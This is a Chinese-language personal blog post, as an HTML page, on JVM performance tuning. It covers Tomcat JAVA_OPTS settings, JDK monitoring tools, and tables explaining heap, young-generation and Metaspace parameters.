<!DOCTYPE html>
<html lang="zh-CN">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Mu Xiaobai(慕小白)" />



<meta name="description" content="JVM参数调优以及日志展示">
<meta property="og:type" content="article">
<meta property="og:title" content="深入理解JVM之性能调优">
<meta property="og:url" content="https://muxiaobai.github.io/2017/08/29/深入理解JVM之性能调优/index.html">
<meta property="og:site_name" content="技术笔记">
<meta property="og:description" content="JVM参数调优以及日志展示">
<meta property="og:image" content="https://muxiaobai.github.io/2017/08/29/深入理解JVM之性能调优/jvm-parameter.png">
<meta property="og:image" content="https://muxiaobai.github.io/2017/08/29/深入理解JVM之性能调优/堆内存.png">
<meta property="og:image" content="https://muxiaobai.github.io/2017/08/29/深入理解JVM之性能调优/jvm-model.png">
<meta property="og:image" content="https://muxiaobai.github.io/2017/08/29/深入理解JVM之性能调优/gc收集器.jpg">
<meta property="og:updated_time" content="2017-12-15T03:04:56.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="深入理解JVM之性能调优">
<meta name="twitter:description" content="JVM参数调优以及日志展示">
<meta name="twitter:image" content="https://muxiaobai.github.io/2017/08/29/深入理解JVM之性能调优/jvm-parameter.png">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternative" href="/atom.xml" title="技术笔记" type="application/atom+xml">



    <link rel="shortcut icon" href="/img/favicon.ico">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>深入理解JVM之性能调优 | 技术笔记</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        open_in_new: true,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>



    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-577a08f17286c0c0"></script>



    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?9d6c9084c010ea425bd063ef91167131";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/avatars.jpg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Mu Xiaobai(慕小白)</a></h1>
        </hgroup>

        
        <p class="header-subtitle">有输入,有输出</p>
        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" results="0" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/categories/">分类</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:zpf12345678910@gmail.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" target="_blank" href="http://weibo.com/u/1751073805" title="新浪微博"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/muxiaobai" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/2016/">2016</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/2017/">2017</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/API/">API</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSS/">CSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cache/">Cache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Canvas/">Canvas</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Collection/">Collection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Concurrent/">Concurrent</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Error/">Error</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exception/">Exception</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/File/">File</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Github/">Github</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hibernate/">Hibernate</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/I-O/">I/O</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Iterator/">Iterator</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/List/">List</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Map/">Map</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Object/">Object</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session/">Session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Set/">Set</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shell/">Shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Socket/">Socket</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Spring/">Spring</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Storage/">Storage</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Struts/">Struts</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sublime/">Sublime</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Thread/">Thread</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Throwable/">Throwable</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/directory/">directory</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/file/">file</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jQuery实践/">jQuery实践</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/">javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jvm/">jvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/">nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/prototype/">prototype</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/svn/">svn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tar/">tar</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tomcat/">tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端/">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/后端/">后端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础命令/">基础命令</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/定位/">定位</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/工具/">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/常用代码/">常用代码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/排序/">排序</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/插件/">插件</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/目录/">目录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/系统/">系统</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编码/">编码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编辑器/">编辑器</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网站/">网站</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/行高/">行高</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/软件/">软件</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://cmsblogs.com/">CMSBLOGS</a>
                    
                    </div>
                </section>
                

                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Mu Xiaobai(慕小白)</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/avatars.jpg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Mu Xiaobai(慕小白)</a></h1>
            </hgroup>
            
            <p class="header-subtitle">有输入,有输出</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/categories/">分类</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto:zpf12345678910@gmail.com" title="Email"></a>
                            
                                <a class="fa 新浪微博" target="_blank" href="http://weibo.com/u/1751073805" title="新浪微博"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/muxiaobai" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-深入理解JVM之性能调优" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/08/29/深入理解JVM之性能调优/" class="article-date">
      <time datetime="2017-08-29T13:58:04.000Z" itemprop="datePublished">2017-08-29</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      深入理解JVM之性能调优
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/java/">java</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jvm/">jvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tomcat/">tomcat</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>&#x5148;&#x653E;&#x4E00;&#x4E0B;&#x6211;&#x5728;&#x6155;&#x8BFE;&#x7F51;&#x4E0A;&#x7684;&#x4E09;&#x7BC7;&#x5173;&#x4E8E;JVM&#x7684;&#x4E00;&#x4E9B;&#x624B;&#x8BB0;<br><a href="http://www.imooc.com/article/6143" target="_blank" rel="external">&#x6DF1;&#x5165;&#x7406;&#x89E3;JVM&#x4E4B;&#x57FA;&#x672C;&#x6784;&#x67B6;</a><br><a href="http://www.imooc.com/article/6319" target="_blank" rel="external">&#x6DF1;&#x5165;&#x7406;&#x89E3;JVM&#x4E4B;&#x5BF9;&#x8C61;&#x751F;&#x547D;&#x5468;&#x671F;</a><br><a href="http://www.imooc.com/article/6461" target="_blank" rel="external">&#x6DF1;&#x5165;&#x7406;&#x89E3;JVM&#x4E4B;&#x7C7B;&#x52A0;&#x8F7D;</a><br>&#x672C;&#x6B21; <a href="http://www.cnblogs.com/redcreen/archive/2011/05/04/2037057.html" target="_blank" rel="external">JVM&#x53C2;&#x6570;</a><br><a href="http://blog.csdn.net/firecoder/article/details/7225654" target="_blank" rel="external">GC&#x77E5;&#x8BC6;&#x8981;&#x70B9;&#x56DE;&#x987E;,&#x6709;&#x6848;&#x4F8B;</a><br><a href="http://blog.csdn.net/a503921892/article/details/39048889" target="_blank" rel="external">&#x201C;-Xmx1024m -Xms1024m -Xmn512m -Xss256k&#x201D;&#x2014;&#x2014;Java&#x8FD0;&#x884C;&#x53C2;&#x6570;(&#x8F6C;)</a><br><a href="http://www.cnblogs.com/redcreen/archive/2011/05/09/2040977.html" target="_blank" rel="external">&#x76D1;&#x6D4B;&#x5DE5;&#x5177;</a><br>web&#x76D1;&#x6D4B;&#x5DE5;&#x5177;Javamelody.jar<a href="https://muxiaobai.github.io/2017/08/02/Javamelody-%E5%B7%A5%E5%85%B7/">Javamelody</a><br>jdk&#x81EA;&#x5E26;&#x5DE5;&#x5177;&#xFF1A;<br>jmc: java mission  control (&#x98DE;&#x884C;&#x8BB0;&#x5F55;&#x5668;(&#x9ED1;&#x5323;&#x5B50;))<br>&#x76D1;&#x6D4B;:jconsole<br>&#x76D1;&#x89C6;jvisualvm   </p>
<p>jvisualvm&#x5DE5;&#x5177;&#x63D2;&#x4EF6;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#x4FEE;&#x6539;&#x4E3A;<a href="https://visualvm.github.io/pluginscenters.html" target="_blank" rel="external">https://visualvm.github.io/pluginscenters.html</a>&#x5728;&#x8FD9;&#x4E2A;&#x4E0A;&#x9762;&#x67E5;&#x627E;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x8FDB;&#x884C;&#x66F4;&#x65B0;&#x3002;</p>
<p>&#x4E0A;&#x7EBF;&#x7684;&#x8BDD;&#x7528;jstack &#x547D;&#x4EE4;&#x884C;&#x6216;&#x8005;Java Mission Control &#x56FE;&#x5F62;&#x5316;&#x754C;&#x9762;&#xFF08;jml&#xFF09;<br><a id="more"></a></p>
<p><img src="/2017/08/29/&#x6DF1;&#x5165;&#x7406;&#x89E3;JVM&#x4E4B;&#x6027;&#x80FD;&#x8C03;&#x4F18;/jvm-parameter.png" alt="jvm"><br><img src="/2017/08/29/&#x6DF1;&#x5165;&#x7406;&#x89E3;JVM&#x4E4B;&#x6027;&#x80FD;&#x8C03;&#x4F18;/&#x5806;&#x5185;&#x5B58;.png" alt="jvm"></p>
<h4 id="&#x4FEE;&#x6539;tomcat-&#x7684;java-opts"><a href="#&#x4FEE;&#x6539;tomcat-&#x7684;java-opts" class="headerlink" title="&#x4FEE;&#x6539;tomcat &#x7684;java_opts"></a>&#x4FEE;&#x6539;tomcat &#x7684;java_opts</h4><p>&#x5728;Catalina.bat &#x4E2D;&#x6DFB;&#x52A0; <code>set JAVA_OPTS=-Xms512m -Xmx1024m -XX:NewSize=512m -XX:MaxNewSize=512m</code><br><code>set JAVA_OPTS=-Xms512m -Xmx1024m -XX:NewSize=768m -XX:MaxNewSize=768m -XX:+PrintGCDetails -Xloggc:..\logs\gc.log -XX:+PrintGCTimeStamps</code><br><code>set JAVA_OPTS=-Xms6g -Xmx6g -XX:NewSize=4g -XX:MaxNewSize=4g  -XX:MaxPermSize=512m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:+PrintGCDetails -Xloggc:..\logs\gc.log -XX:+PrintGCDateStamps  -XX:+PrintTenuringDistribution</code></p>
<h4 id="&#x5404;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x542B;&#x4E49;"><a href="#&#x5404;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x542B;&#x4E49;" class="headerlink" title="&#x5404;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x542B;&#x4E49;"></a>&#x5404;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x542B;&#x4E49;</h4><p><a href="http://www.cnblogs.com/redcreen/archive/2011/05/04/2037057.html" target="_blank" rel="external">JVM&#x53C2;&#x6570;</a></p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x53C2;&#x6570;&#x540D;&#x79F0;</th>
<th style="text-align:center">&#x542B;&#x4E49;</th>
<th style="text-align:center">&#x9ED8;&#x8BA4;&#x503C;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-Xms</td>
<td style="text-align:center">&#x521D;&#x59CB;&#x5806;&#x5927;&#x5C0F;    &#x7269;&#x7406;&#x5185;&#x5B58;&#x7684;1/64(&lt;1GB)</td>
<td style="text-align:center">&#x9ED8;&#x8BA4;(MinHeapFreeRatio&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x8C03;&#x6574;)&#x7A7A;&#x4F59;&#x5806;&#x5185;&#x5B58;&#x5C0F;&#x4E8E;40%&#x65F6;&#xFF0C;JVM&#x5C31;&#x4F1A;&#x589E;&#x5927;&#x5806;&#x76F4;&#x5230;-Xmx&#x7684;&#x6700;&#x5927;&#x9650;&#x5236;.</td>
</tr>
<tr>
<td style="text-align:center">-Xmx</td>
<td style="text-align:center">&#x6700;&#x5927;&#x5806;&#x5927;&#x5C0F;</td>
<td style="text-align:center">&#x7269;&#x7406;&#x5185;&#x5B58;&#x7684;1/4(&lt;1GB)</td>
<td>&#x9ED8;&#x8BA4;(MaxHeapFreeRatio&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x8C03;&#x6574;)&#x7A7A;&#x4F59;&#x5806;&#x5185;&#x5B58;&#x5927;&#x4E8E;70%&#x65F6;&#xFF0C;JVM&#x4F1A;&#x51CF;&#x5C11;&#x5806;&#x76F4;&#x5230; -Xms&#x7684;&#x6700;&#x5C0F;&#x9650;&#x5236;</td>
</tr>
<tr>
<td style="text-align:center">-Xmn</td>
<td style="text-align:center">&#x5E74;&#x8F7B;&#x4EE3;&#x5927;&#x5C0F;(1.4 or lator) &#x9ED8;&#x8BA4;1/64</td>
<td style="text-align:center">&#x6CE8;&#x610F;&#xFF1A;&#x6B64;&#x5904;&#x7684;&#x5927;&#x5C0F;&#x662F;&#xFF08;eden+ 2 survivor space).&#x4E0E;jmap -heap&#x4E2D;&#x663E;&#x793A;&#x7684;New gen&#x662F;&#x4E0D;&#x540C;&#x7684;&#x3002;&#x6574;&#x4E2A;&#x5806;&#x5927;&#x5C0F;=&#x5E74;&#x8F7B;&#x4EE3;&#x5927;&#x5C0F; + &#x5E74;&#x8001;&#x4EE3;&#x5927;&#x5C0F; + &#x6301;&#x4E45;&#x4EE3;&#x5927;&#x5C0F;.&#x589E;&#x5927;&#x5E74;&#x8F7B;&#x4EE3;&#x540E;,&#x5C06;&#x4F1A;&#x51CF;&#x5C0F;&#x5E74;&#x8001;&#x4EE3;&#x5927;&#x5C0F;.&#x6B64;&#x503C;&#x5BF9;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x5F71;&#x54CD;&#x8F83;&#x5927;,Sun&#x5B98;&#x65B9;&#x63A8;&#x8350;&#x914D;&#x7F6E;&#x4E3A;&#x6574;&#x4E2A;&#x5806;&#x7684;3/8</td>
</tr>
<tr>
<td style="text-align:center">-XX:NewSize</td>
<td style="text-align:center">&#x8BBE;&#x7F6E;&#x5E74;&#x8F7B;&#x4EE3;&#x5927;&#x5C0F;(for 1.3/1.4)</td>
</tr>
<tr>
<td style="text-align:center">-XX:MaxNewSize</td>
<td style="text-align:center">&#x5E74;&#x8F7B;&#x4EE3;&#x6700;&#x5927;&#x503C;(for 1.3/1.4)</td>
</tr>
<tr>
<td style="text-align:center">-XX:PermSize</td>
<td style="text-align:center">&#x8BBE;&#x7F6E;&#x6301;&#x4E45;&#x4EE3;(perm gen)&#x521D;&#x59CB;&#x503C;</td>
<td style="text-align:center">&#x7269;&#x7406;&#x5185;&#x5B58;&#x7684;1/64</td>
</tr>
<tr>
<td style="text-align:center">-XX:MaxPermSize</td>
<td style="text-align:center">&#x8BBE;&#x7F6E;&#x6301;&#x4E45;&#x4EE3;&#x6700;&#x5927;&#x503C;</td>
<td style="text-align:center">&#x7269;&#x7406;&#x5185;&#x5B58;&#x7684;1/4</td>
</tr>
<tr>
<td style="text-align:center">-XX:NewRatio</td>
<td style="text-align:center"></td>
<td style="text-align:center">&#x5E74;&#x8F7B;&#x4EE3;(&#x5305;&#x62EC;Eden&#x548C;&#x4E24;&#x4E2A;Survivor&#x533A;)&#x4E0E;&#x5E74;&#x8001;&#x4EE3;&#x7684;&#x6BD4;&#x503C;(&#x9664;&#x53BB;&#x6301;&#x4E45;&#x4EE3;)</td>
<td>&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;2&#xFF0C;-XX:NewRatio=4&#x8868;&#x793A;&#x5E74;&#x8F7B;&#x4EE3;&#x4E0E;&#x5E74;&#x8001;&#x4EE3;&#x6240;&#x5360;&#x6BD4;&#x503C;&#x4E3A;1:4,&#x5E74;&#x8F7B;&#x4EE3;&#x5360;&#x6574;&#x4E2A;&#x5806;&#x6808;&#x7684;1/5 Xms=Xmx&#x5E76;&#x4E14;&#x8BBE;&#x7F6E;&#x4E86;Xmn&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8BE5;&#x53C2;&#x6570;&#x4E0D;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#x3002;</td>
</tr>
<tr>
<td style="text-align:center">-XX:SurvivorRatio</td>
<td style="text-align:center">Eden&#x533A;&#x4E0E;Survivor&#x533A;&#x7684;&#x5927;&#x5C0F;&#x6BD4;&#x503C;</td>
<td style="text-align:center">&#x9ED8;&#x8BA4;&#x503C;&#x4E3A;8&#xFF0C;&#x8BBE;&#x7F6E;&#x4E3A;8,&#x5219;&#x4E24;&#x4E2A;Survivor&#x533A;&#x4E0E;&#x4E00;&#x4E2A;Eden&#x533A;&#x7684;&#x6BD4;&#x503C;&#x4E3A;2:8,&#x4E00;&#x4E2A;Survivor&#x533A;&#x5360;&#x6574;&#x4E2A;&#x5E74;&#x8F7B;&#x4EE3;&#x7684;1/10</td>
</tr>
</tbody>
</table>
<p>&#x6CE8;&#x610F;&#xFF1A;&#x4E24;&#x4E2A;&#x6BD4;&#x7387;&#x95EE;&#x9898;-XX:NewRatio  -XX:SurvivorRatio  </p>
<p><img src="/2017/08/29/&#x6DF1;&#x5165;&#x7406;&#x89E3;JVM&#x4E4B;&#x6027;&#x80FD;&#x8C03;&#x4F18;/jvm-model.png" alt="jvm"></p>
<p>&#x8BBE;&#x7F6E;&#x4E86;&#x5806;&#x7684;&#x5927;&#x5C0F;-Xms &#x548C;-Xmx&#x4E4B;&#x540E;&#xFF0C;&#x518D;&#x4FEE;&#x6539;-Xmn Eden&#x540E;&#xFF0C; Survivor &#x6839;&#x636E;&#x6BD4;&#x4F8B;&#x914D;&#x7F6E;&#xFF0C;Old&#x533A;&#x57DF;&#x5C31;&#x4F1A;&#x53D7;&#x5F71;&#x54CD;&#xFF08;&#xFF0C;&#x6CA1;&#x6709;Perm&#x533A;&#x57DF;&#x4E86;&#xFF09;<br>&#x5BF9;&#x4E8E;&#x975E;&#x5806;&#x6765;&#x8BF4;&#x5C31;&#x6709;MetaSpace Code Class</p>
<p>jdk1.8&#x4E4B;&#x540E;&#xFF0C;&#x628A;perm&#x4FEE;&#x6539;&#x4E3A;matespace&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x4EE5;&#x53CA;&#x4ECB;&#x7ECD;<br>&#x5728;JDK8&#x4E2D;,classe metadata(the virtual machines internal presentation of Java class),<br>&#x88AB;&#x5B58;&#x50A8;&#x5728;&#x53EB;&#x505A;Metaspace&#x7684;native memory&#x3002;&#x4E00;&#x4E9B;&#x65B0;&#x7684;flags&#x88AB;&#x52A0;&#x5165;&#xFF1A;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x53C2;&#x6570;&#x540D;&#x79F0;</th>
<th style="text-align:center">&#x542B;&#x4E49;</th>
<th style="text-align:center">&#x9ED8;&#x8BA4;&#x503C;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-XX:MetaspaceSize</td>
<td style="text-align:center">class metadata&#x7684;&#x521D;&#x59CB;&#x7A7A;&#x95F4;&#x914D;&#x989D;&#xFF0C;&#x4EE5;bytes&#x4E3A;&#x5355;&#x4F4D;&#xFF0C;</td>
<td style="text-align:center">&#x8FBE;&#x5230;&#x8BE5;&#x503C;&#x5C31;&#x4F1A;&#x89E6;&#x53D1;&#x5783;&#x573E;&#x6536;&#x96C6;&#x8FDB;&#x884C;&#x7C7B;&#x578B;&#x5378;&#x8F7D;&#xFF0C;&#x540C;&#x65F6;GC&#x4F1A;&#x5BF9;&#x8BE5;&#x503C;&#x8FDB;&#x884C;&#x8C03;&#x6574;&#xFF1A;&#x5982;&#x679C;&#x91CA;&#x653E;&#x4E86;&#x5927;&#x91CF;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x5C31;&#x9002;&#x5F53;&#x7684;&#x964D;&#x4F4E;&#x8BE5;&#x503C;&#xFF1B;&#x5982;&#x679C;&#x91CA;&#x653E;&#x4E86;&#x5F88;&#x5C11;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x90A3;&#x4E48;&#x5728;&#x4E0D;&#x8D85;&#x8FC7;MaxMetaspaceSize&#xFF08;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x4E86;&#x7684;&#x8BDD;&#xFF09;&#xFF0C;&#x9002;&#x5F53;&#x7684;&#x63D0;&#x9AD8;&#x8BE5;&#x503C;&#x3002;</td>
</tr>
<tr>
<td style="text-align:center">-XX:MaxMetaspaceSize</td>
<td style="text-align:center">&#x53EF;&#x4EE5;&#x4E3A;class metadata&#x5206;&#x914D;&#x7684;&#x6700;&#x5927;&#x7A7A;&#x95F4;&#x3002;</td>
<td style="text-align:center">&#x9ED8;&#x8BA4;&#x662F;&#x6CA1;&#x6709;&#x9650;&#x5236;&#x7684;&#x3002; 32&#x4F4D;&#x7684;JVM&#x9ED8;&#x8BA4;MaxPermSize&#x662F;64M &#x4F46;&#x5982;&#x679C;&#x4E0D;&#x6307;&#x5B9A;MaxMetaspaceSize&#x7684;&#x8BDD;&#xFF0C;Metaspace&#x7684;&#x5927;&#x5C0F;&#x4EC5;&#x53D7;&#x9650;&#x4E8E;native memory&#x7684;&#x5269;&#x4F59;&#x5927;&#x5C0F;&#x3002;</td>
</tr>
<tr>
<td style="text-align:center">-XX:MinMetaspaceFreeRatio</td>
<td style="text-align:center">&#x5728;GC&#x4E4B;&#x540E;&#xFF0C;&#x6700;&#x5C0F;&#x7684;Metaspace&#x5269;&#x4F59;&#x7A7A;&#x95F4;&#x5BB9;&#x91CF;&#x7684;&#x767E;&#x5206;&#x6BD4;&#xFF0C;&#x51CF;&#x5C11;&#x4E3A;class metadata&#x5206;&#x914D;&#x7A7A;&#x95F4;&#x5BFC;&#x81F4;&#x7684;&#x5783;&#x573E;&#x6536;&#x96C6;</td>
</tr>
<tr>
<td style="text-align:center">-XX:MaxMetaspaceFreeRatio</td>
<td style="text-align:center">&#x5728;GC&#x4E4B;&#x540E;&#xFF0C;&#x6700;&#x5927;&#x7684;Metaspace&#x5269;&#x4F59;&#x7A7A;&#x95F4;&#x5BB9;&#x91CF;&#x7684;&#x767E;&#x5206;&#x6BD4;&#xFF0C;&#x51CF;&#x5C11;&#x4E3A;class metadata&#x91CA;&#x653E;&#x7A7A;&#x95F4;&#x5BFC;&#x81F4;&#x7684;&#x5783;&#x573E;&#x6536;&#x96C6;</td>
</tr>
</tbody>
</table>
